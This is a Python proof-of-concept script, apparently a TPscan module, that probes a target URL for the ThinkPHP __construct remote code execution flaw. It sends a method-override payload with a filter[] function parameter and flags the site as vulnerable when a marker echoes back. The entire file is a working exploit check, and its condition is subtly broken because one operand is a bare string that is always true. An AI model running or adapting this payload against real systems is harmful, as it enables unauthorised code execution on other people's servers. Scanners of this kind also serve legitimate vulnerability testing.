#!/usr/bin/env python
# coding=utf-8
import urllib
import requests
import urllib3
urllib3.disable_warnings()

def thinkphp_index_construct_rce_verify(url):
    pocdict = {
        "vulnname":"thinkphp_index_construct_rce",
        "isvul": False,
        "vulnurl":"",
        "payload":"",
        "proof":"",
        "response":"",
        "exception":"",
    }
    headers = {
        "User-Agent": 'TPscan',
        "Content-Type": "application/x-www-form-urlencoded",
    }
    payload = 's=f7e0b956540676a129760a3eae309294&_method=__construct&method&filter[]=var_dump'
    try:
        vurl = urllib.parse.urljoin(url, 'index.php?s=index/index/index')
        req = requests.post(vurl, data=payload, headers=headers, timeout=15, verify=False)
        if r"string(32)" and r"56540676a129760a3ea" in req.text:
            pocdict['isvul'] = True
            pocdict['vulnurl'] = vurl
            pocdict['payload'] = payload
            pocdict['proof'] = '56540676a129760a3ea'
            pocdict['response'] = req.text
            print(pocdict)

    except:
        pass

